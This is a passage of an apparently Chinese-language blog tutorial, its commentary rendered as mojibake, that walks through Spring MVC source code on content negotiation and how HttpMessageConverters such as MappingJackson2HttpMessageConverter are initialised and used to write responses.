java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//RequestResponseBodyMethodProcessorç»§æ‰¿è¿™ç±»</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AbstractMessageConverterMethodProcessor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractMessageConverterMethodArgumentResolver</span><br><span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerMethodReturnValueHandler</span> &#123;<br><br>    ...<br>    <br>    <span class="hljs-comment">//æ‰¿æ¥ä¸Šä¸€èŠ‚å†…å®¹</span><br>    <span class="hljs-keyword">protected</span> &lt;T&gt; <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeWithMessageConverters</span><span class="hljs-params">(<span class="hljs-meta">@Nullable</span> T value, MethodParameter returnType,</span><br><span class="hljs-params">                ServletServerHttpRequest inputMessage, ServletServerHttpResponse outputMessage)</span><br>                <span class="hljs-keyword">throws</span> IOException, HttpMediaTypeNotAcceptableException, HttpMessageNotWritableException &#123;<br><br>            Object body;<br>            Class&lt;?&gt; valueType;<br>            Type targetType;<br><br>            <span class="hljs-keyword">if</span> (value <span class="hljs-keyword">instanceof</span> CharSequence) &#123;<br>                body = value.toString();<br>                valueType = String.class;<br>                targetType = String.class;<br>            &#125;<br>            <span class="hljs-keyword">else</span> &#123;<br>                body = value;<br>                valueType = getReturnValueType(body, returnType);<br>                targetType = GenericTypeResolver.resolveType(getGenericType(returnType), returnType.getContainingClass());<br>            &#125;<br><br>...<br><br>            <span class="hljs-comment">//å†…å®¹åå•†ï¼ˆæµè§ˆå™¨é»˜è®¤ä¼šä»¥è¯·æ±‚å¤´(å‚æ•°Accept)çš„æ–¹å¼å‘Šè¯‰æœåŠ¡å™¨ä»–èƒ½æ¥å—ä»€ä¹ˆæ ·çš„å†…å®¹ç±»å‹ï¼‰</span><br>            <span class="hljs-type">MediaType</span> <span class="hljs-variable">selectedMediaType</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>            <span class="hljs-type">MediaType</span> <span class="hljs-variable">contentType</span> <span class="hljs-operator">=</span> outputMessage.getHeaders().getContentType();<br>            <span class="hljs-type">boolean</span> <span class="hljs-variable">isContentTypePreset</span> <span class="hljs-operator">=</span> contentType != <span class="hljs-literal">null</span> &amp;&amp; contentType.isConcrete();<br>            <span class="hljs-keyword">if</span> (isContentTypePreset) &#123;<br>                <span class="hljs-keyword">if</span> (logger.isDebugEnabled()) &#123;<br>                    logger.debug(<span class="hljs-string">&quot;Found &#x27;Content-Type:&quot;</span> + contentType + <span class="hljs-string">&quot;&#x27; in response&quot;</span>);<br>                &#125;<br>                selectedMediaType = contentType;<br>            &#125;<br>            <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> inputMessage.getServletRequest();<br>                List&lt;MediaType&gt; acceptableTypes = getAcceptableMediaTypes(request);<br>                <span class="hljs-comment">//æœåŠ¡å™¨æœ€ç»ˆæ ¹æ®è‡ªå·±è‡ªèº«çš„èƒ½åŠ›ï¼Œå†³å®šæœåŠ¡å™¨èƒ½ç”Ÿäº§å‡ºä»€ä¹ˆæ ·å†…å®¹ç±»å‹çš„æ•°æ®</span><br>                List&lt;MediaType&gt; producibleTypes = getProducibleMediaTypes(request, valueType, targetType);<br><br>                <span class="hljs-keyword">if</span> (body != <span class="hljs-literal">null</span> &amp;&amp; producibleTypes.isEmpty()) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpMessageNotWritableException</span>(<br>                            <span class="hljs-string">&quot;No converter found for return value of type: &quot;</span> + valueType);<br>                &#125;<br>                List&lt;MediaType&gt; mediaTypesToUse = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>                <span class="hljs-keyword">for</span> (MediaType requestedType : acceptableTypes) &#123;<br>                    <span class="hljs-keyword">for</span> (MediaType producibleType : producibleTypes) &#123;<br>                        <span class="hljs-keyword">if</span> (requestedType.isCompatibleWith(producibleType)) &#123;<br>                            mediaTypesToUse.add(getMostSpecificMediaType(requestedType, producibleType));<br>                        &#125;<br>                    &#125;<br>                &#125;<br>                <span class="hljs-keyword">if</span> (mediaTypesToUse.isEmpty()) &#123;<br>                    <span class="hljs-keyword">if</span> (body != <span class="hljs-literal">null</span>) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpMediaTypeNotAcceptableException</span>(producibleTypes);<br>                    &#125;<br>                    <span class="hljs-keyword">if</span> (logger.isDebugEnabled()) &#123;<br>                        logger.debug(<span class="hljs-string">&quot;No match for &quot;</span> + acceptableTypes + <span class="hljs-string">&quot;, supported: &quot;</span> + producibleTypes);<br>                    &#125;<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br><br>                MediaType.sortBySpecificityAndQuality(mediaTypesToUse);<br><br>                <span class="hljs-comment">//é€‰æ‹©ä¸€ä¸ªMediaType</span><br>                <span class="hljs-keyword">for</span> (MediaType mediaType : mediaTypesToUse) &#123;<br>                    <span class="hljs-keyword">if</span> (mediaType.isConcrete()) &#123;<br>                        selectedMediaType = mediaType;<br>                        <span class="hljs-keyword">break</span>;<br>                    &#125;<br>                    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (mediaType.isPresentIn(ALL_APPLICATION_MEDIA_TYPES)) &#123;<br>                        selectedMediaType = MediaType.APPLICATION_OCTET_STREAM;<br>                        <span class="hljs-keyword">break</span>;<br>                    &#125;<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (logger.isDebugEnabled()) &#123;<br>                    logger.debug(<span class="hljs-string">&quot;Using &#x27;&quot;</span> + selectedMediaType + <span class="hljs-string">&quot;&#x27;, given &quot;</span> +<br>                            acceptableTypes + <span class="hljs-string">&quot; and supported &quot;</span> + producibleTypes);<br>                &#125;<br>            &#125;<br><br>        <br>            <span class="hljs-keyword">if</span> (selectedMediaType != <span class="hljs-literal">null</span>) &#123;<br>                selectedMediaType = selectedMediaType.removeQualityValue();<br>                <span class="hljs-comment">//æœ¬èŠ‚ä¸»è§’ï¼šHttpMessageConverter</span><br>                <span class="hljs-keyword">for</span> (HttpMessageConverter&lt;?&gt; converter : <span class="hljs-built_in">this</span>.messageConverters) &#123;<br>                    <span class="hljs-type">GenericHttpMessageConverter</span> <span class="hljs-variable">genericConverter</span> <span class="hljs-operator">=</span> (converter <span class="hljs-keyword">instanceof</span> GenericHttpMessageConverter ?<br>                            (GenericHttpMessageConverter&lt;?&gt;) converter : <span class="hljs-literal">null</span>);<br>                    <br>                    <span class="hljs-comment">//åˆ¤æ–­æ˜¯å¦å¯å†™</span><br>                    <span class="hljs-keyword">if</span> (genericConverter != <span class="hljs-literal">null</span> ?<br>                            ((GenericHttpMessageConverter) converter).canWrite(targetType, valueType, selectedMediaType) :<br>                            converter.canWrite(valueType, selectedMediaType)) &#123;<br>                        body = getAdvice().beforeBodyWrite(body, returnType, selectedMediaType,<br>                                (Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpMessageConverter</span>&lt;?&gt;&gt;) converter.getClass(),<br>                                inputMessage, outputMessage);<br>                        <span class="hljs-keyword">if</span> (body != <span class="hljs-literal">null</span>) &#123;<br>                            <span class="hljs-type">Object</span> <span class="hljs-variable">theBody</span> <span class="hljs-operator">=</span> body;<br>                            LogFormatUtils.traceDebug(logger, traceOn -&gt;<br>                                    <span class="hljs-string">&quot;Writing [&quot;</span> + LogFormatUtils.formatValue(theBody, !traceOn) + <span class="hljs-string">&quot;]&quot;</span>);<br>                            addContentDispositionHeader(inputMessage, outputMessage);<br><span class="hljs-comment">//å¼€å§‹å†™å…¥</span><br>                            <span class="hljs-keyword">if</span> (genericConverter != <span class="hljs-literal">null</span>) &#123;<br>                                genericConverter.write(body, targetType, selectedMediaType, outputMessage);<br>                            &#125;<br>                            <span class="hljs-keyword">else</span> &#123;<br>                                ((HttpMessageConverter) converter).write(body, selectedMediaType, outputMessage);<br>                            &#125;<br>                        &#125;<br>                        <span class="hljs-keyword">else</span> &#123;<br>                            <span class="hljs-keyword">if</span> (logger.isDebugEnabled()) &#123;<br>                                logger.debug(<span class="hljs-string">&quot;Nothing to write: null body&quot;</span>);<br>                            &#125;<br>                        &#125;<br>                        <span class="hljs-keyword">return</span>;<br>                    &#125;<br>                &#125;<br>            &#125;<br>...<br>        &#125;<br></code></pre></td></tr></table></figure><p><code>HTTPMessageConverter</code>æ¥å£ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Strategy interface for converting from and to HTTP requests and responses.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">HttpMessageConverter</span>&lt;T&gt; &#123;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Indicates whether the given class can be read by this converter.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">boolean</span> <span class="hljs-title function_">canRead</span><span class="hljs-params">(Class&lt;?&gt; clazz, <span class="hljs-meta">@Nullable</span> MediaType mediaType)</span>;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Indicates whether the given class can be written by this converter.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">boolean</span> <span class="hljs-title function_">canWrite</span><span class="hljs-params">(Class&lt;?&gt; clazz, <span class="hljs-meta">@Nullable</span> MediaType mediaType)</span>;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Return the list of &#123;<span class="hljs-doctag">@link</span> MediaType&#125; objects supported by this converter.</span><br><span class="hljs-comment"> */</span><br>List&lt;MediaType&gt; <span class="hljs-title function_">getSupportedMediaTypes</span><span class="hljs-params">()</span>;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Read an object of the given type from the given input message, and returns it.</span><br><span class="hljs-comment"> */</span><br>T <span class="hljs-title function_">read</span><span class="hljs-params">(Class&lt;? extends T&gt; clazz, HttpInputMessage inputMessage)</span><br><span class="hljs-keyword">throws</span> IOException, HttpMessageNotReadableException;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Write an given object to the given output message.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">void</span> <span class="hljs-title function_">write</span><span class="hljs-params">(T t, <span class="hljs-meta">@Nullable</span> MediaType contentType, HttpOutputMessage outputMessage)</span><br><span class="hljs-keyword">throws</span> IOException, HttpMessageNotWritableException;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p><code>HttpMessageConverter</code>: çœ‹æ˜¯å¦æ”¯æŒå°† æ­¤ <code>Class</code>ç±»å‹çš„å¯¹è±¡ï¼Œè½¬ä¸º<code>MediaType</code>ç±»å‹çš„æ•°æ®ã€‚</p><p>ä¾‹å­ï¼š<code>Person</code>å¯¹è±¡è½¬ä¸ºJSONï¼Œæˆ–è€… JSONè½¬ä¸º<code>Person</code>ï¼Œè¿™å°†ç”¨åˆ°<code>MappingJackson2HttpMessageConverter</code></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210205010509984.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MappingJackson2HttpMessageConverter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractJackson2HttpMessageConverter</span> &#123;<br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>å…³äº<code>MappingJackson2HttpMessageConverter</code>çš„å®ä¾‹åŒ–è¯·çœ‹ä¸‹èŠ‚ã€‚</p><h3 id="å…³äºHttpMessageConvertersçš„åˆå§‹åŒ–"><a href="#å…³äºHttpMessageConvertersçš„åˆå§‹åŒ–" class="headerlink" title="å…³äºHttpMessageConvertersçš„åˆå§‹åŒ–"></a>å…³äºHttpMessageConvertersçš„åˆå§‹åŒ–</h3><p><code>DispatcherServlet</code>çš„åˆå§‹åŒ–æ—¶ä¼šè°ƒç”¨<code>initHandlerAdapters(ApplicationContext context)</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DispatcherServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">FrameworkServlet</span> &#123;<br>    <br>    ...<br>    <br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initHandlerAdapters</span><span class="hljs-params">(ApplicationContext context)</span> &#123;<br><span class="hljs-built_in">this</span>.handlerAdapters = <span class="hljs-literal">null</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.detectAllHandlerAdapters) &#123;<br><span class="hljs-comment">// Find all HandlerAdapters in the ApplicationContext, including ancestor contexts.</span><br>Map&lt;String, HandlerAdapter&gt; matchingBeans =<br>BeanFactoryUtils.beansOfTypeIncludingAncestors(context, HandlerAdapter.class, <span class="hljs-literal">true</span>, <span class="hljs-literal">false</span>);<br><span class="hljs-keyword">if</span> (!matchingBeans.isEmpty()) &#123;<br><span class="hljs-built_in">this</span>.handlerAdapters = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;(matchingBeans.values());<br><span class="hljs-comment">// We keep HandlerAdapters in sorted order.</span><br>AnnotationAwareOrderComparator.sort(<span class="hljs-built_in">this</span>.handlerAdapters);<br>&#125;<br>&#125;<br>      ...<br></code></pre></td></tr></table></figure><p>ä¸Šè¿°ä»£ç ä¼šåŠ è½½<code>ApplicationContext</code>çš„æ‰€æœ‰<code>HandlerAdapter</code>ï¼Œç”¨æ¥å¤„ç†<code>@RequestMapping</code>çš„<code>RequestMappingHandlerAdapter</code>å®ç°<code>HandlerAdapter</code>æ¥å£ï¼Œ<code>RequestMappingHandlerAdapter</code>ä¹Ÿè¢«å®ä¾‹åŒ–ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RequestMappingHandlerAdapter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractHandlerMethodAdapter</span><br><span class="hljs-keyword">implements</span> <span class="hljs-title class_">BeanFactoryAware</span>, InitializingBean &#123;<br>    <br>    ...<br><br>    <span class="hljs-keyword">private</span> List&lt;HttpMessageConverter&lt;?&gt;&gt; messageConverters;<br>    <br>    ...<br>    <br><span class="hljs-keyword">public</span> <span class="hljs-title function_">RequestMappingHandlerAdapter</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-built_in">this</span>.messageConverters = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;(<span class="hljs-number">4</span>);<br><span class="hljs-built_in">this</span>.messageConverters.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayHttpMessageConverter</span>());<br><span class="hljs-built_in">this</span>.messageConverters.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringHttpMessageConverter</span>());<br><span class="hljs-keyword">if</span> (!shouldIgnoreXml) &#123;<br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-built_in">this</span>.messageConverters.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">SourceHttpMessageConverter</span>&lt;&gt;());<br>&#125;<br><span class="hljs-keyword">catch</span> (Error err) &#123;<br><span class="hljs-comment">// Ignore when no TransformerFactory implementation is available</span><br>&#125;<br>&#125;<br><span class="hljs-built_in">this</span>.messageConverters.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">AllEncompassingFormHttpMessageConverter</span>());<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨æ„é€ å™¨ä¸­çœ‹åˆ°<strong>ä¸€å †</strong><code>HttpMessageConverter</code>ã€‚æ¥ç€ï¼Œé‡ç‚¹æŸ¥çœ‹<code>AllEncompassingFormHttpMessageConverter</code>ç±»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AllEncompassingFormHttpMessageConverter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">FormHttpMessageConverter</span> &#123;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Boolean flag controlled by a &#123;<span class="hljs-doctag">@code</span> spring.xml.ignore&#125; system property that instructs Spring to</span><br><span class="hljs-comment"> * ignore XML, i.e. to not initialize the XML-related infrastructure.</span><br><span class="hljs-comment"> * &lt;p&gt;The default is &quot;false&quot;.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">shouldIgnoreXml</span> <span class="hljs-operator">=</span> SpringProperties.getFlag(<span class="hljs-string">&quot;spring.xml.ignore&quot;</span>);<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> jaxb2Present;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> jackson2Present;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> jackson2XmlPresent;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> jackson2SmilePresent;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> gsonPresent;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> jsonbPresent;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> kotlinSerializationJsonPresent;<br><br><span class="hljs-keyword">static</span> &#123;<br><span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> AllEncompassingFormHttpMessageConverter.class.getClassLoader();<br>jaxb2Present = ClassUtils.isPresent(<span class="hljs-string">&quot;javax.xml.bind.Binder&quot;</span>, classLoader);<br>jackson2Present = ClassUtils.isPresent(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.ObjectMapper&quot;</span>, classLoader) &amp;&amp;<br>ClassUtils.isPresent(<span class="hljs-string">&quot;com.fasterxml.jackson.core.JsonGenerator&quot;</span>, classLoader);<br>jackson2XmlPresent = ClassUtils.isPresent(<span class="hljs-string">&quot;com.fasterxml.jackson.dataformat.xml.XmlMapper&quot;</span>, classLoader);<br>jackson2SmilePresent = ClassUtils.isPresent(<span class="hljs-string">&quot;com.fasterxml.jackson.dataformat.smile.SmileFactory&quot;</span>, classLoader);<br>gsonPresent = ClassUtils.isPresent(<span class="hljs-string">&quot;com.google.gson.Gson&quot;</span>, classLoader);<br>jsonbPresent = ClassUtils.isPresent(<span class="hljs-string">&quot;javax.json.bind.Jsonb&quot;</span>, classLoader);<br>kotlinSerializationJsonPresent = ClassUtils.isPresent(<span class="hljs-string">&quot;kotlinx.serialization.json.Json&quot;</span>, classLoader);<br>&#125;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">AllEncompassingFormHttpMessageConverter</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-keyword">if</span> (!shouldIgnoreXml) &#123;<br><span class="hljs-keyword">try</span> &#123;<br>addPartConverter(<span class="hljs-keyword">new</span> <span class="hljs-title class_">SourceHttpMessageConverter</span>&lt;&gt;());<br>&#125;<br><span class="hljs-keyword">catch</span> (Error err) &#123;<br><span class="hljs-comment">// Ignore when no TransformerFactory implementation is available</span><br>&#125;<br><br><span class="hljs-keyword">if</span> (jaxb2Present &amp;&amp; !jackson2XmlPresent) &#123;<br>addPartConverter(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Jaxb2RootElementHttpMessageConverter</span>());<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (jackson2Present) &#123;<br>addPartConverter(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MappingJackson2HttpMessageConverter</span>());<span class="hljs-comment">//&lt;----é‡ç‚¹çœ‹è¿™é‡Œ</span><br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (gsonPresent) &#123;<br>addPartConverter(<span class="hljs-keyword">new</span> <span class="hljs-title class_">GsonHttpMessageConverter</span>());<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (jsonbPresent) &#123;<br>addPartConverter(<span class="hljs-keyword">new</span> <span class="hljs-title class_">JsonbHttpMessageConverter</span>());<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (kotlinSerializationJsonPresent) &#123;<br>addPartConverter(<span class="hljs-keyword">new</span> <span class="hljs-title class_">KotlinSerializationJsonHttpMessageConverter</span>());<br>&#125;<br><br><span class="hljs-keyword">if</span> (jackson2XmlPresent &amp;&amp; !shouldIgnoreXml) &#123;<br>addPartConverter(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MappingJackson2XmlHttpMessageConverter</span>());<br>&#125;<br><br><span class="hljs-keyword">if</span> (jackson2SmilePresent) &#123;<br>addPartConverter(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MappingJackson2SmileHttpMessageConverter</span>());<br>&#125;<br>&#125;<br><br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FormHttpMessageConverter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HttpMessageConverter</span>&lt;MultiValueMap&lt;String, ?&gt;&gt; &#123;<br>    <br>    ...<br>        <br>    <span class="hljs-keyword">private</span> List&lt;HttpMessageConverter&lt;?&gt;&gt; partConverters = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>    <br>    ...<br>        <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addPartConverter</span><span class="hljs-params">(HttpMessageConverter&lt;?&gt; partConverter)</span> &#123;<br>Assert.notNull(partConverter, <span class="hljs-string">&quot;&#x27;partConverter&#x27; must not be null&quot;</span>);<br><span class="hljs-built_in">this</span>.partConverters.add(partConverter);<br>&#125;<br>    <br>    ...<br>&#125;<br><br></code></pre></td></tr></table></figure><p>åœ¨<code>AllEncompassingFormHttpMessageConverter</code>ç±»æ„é€ å™¨çœ‹åˆ°<code>MappingJackson2HttpMessageConverter</code>ç±»çš„å®ä¾‹åŒ–ï¼Œ<code>AllEncompassingFormHttpMessageConverter</code><strong>åŒ…å«</strong><code>MappingJackson2HttpMessageConverter</code>ã€‚</p><p> 